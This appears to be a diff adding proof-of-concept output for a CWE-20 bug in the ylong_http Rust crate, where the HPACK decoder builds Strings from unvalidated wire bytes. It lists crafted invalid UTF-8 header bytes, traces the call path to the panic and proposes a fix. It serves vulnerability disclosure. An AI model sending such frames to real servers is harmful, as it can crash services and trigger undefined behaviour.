@@ -1,0 +1,32 @@
+═══════════════════════════════════════════════════════════════════
+PoC: HPACK UTF-8 Bypass via Real Public API (CWE-20)
+═══════════════════════════════════════════════════════════════════
+Compiled: ylong_http (path dependency, real crate)
+Entry:    ylong_http::h2::FrameDecoder::decode() [pub]
+Target:   hpack/decoder.rs:192 — String::from_utf8_unchecked
+═══════════════════════════════════════════════════════════════════
+
+[Step 1] Crafted HTTP/2 HEADERS frame (17 bytes)
+  HPACK payload: 8 bytes
+  Invalid UTF-8 name bytes:  [80, 81, 82]
+  Invalid UTF-8 value bytes: [c0, 80]
+
+[Step 2] Calling FrameDecoder::decode() (real compiled code)...
+  Code path: FrameDecoder::decode()
+    → HpackDecoder::decode()
+      → get_header_by_name_and_value()
+        → String::from_utf8_unchecked([0x80, 0x81, 0x82])
+
+[Step 3] ** PANIC ** — UB triggered during decode!
+  String::from_utf8_unchecked created invalid String,
+  and downstream code panicked when accessing it.
+
+═══════════════════════════════════════════════════════════════════
+VULNERABILITY CONFIRMED:
+  ylong_http's HPACK decoder calls String::from_utf8_unchecked()
+  on bytes from the wire, without any UTF-8 validation.
+  This violates Rust's String invariant → Undefined Behavior.
+
+  Attack: any HTTP/2 peer can send malicious HEADERS frames.
+  Fix: use String::from_utf8() with proper error handling.
+═══════════════════════════════════════════════════════════════════
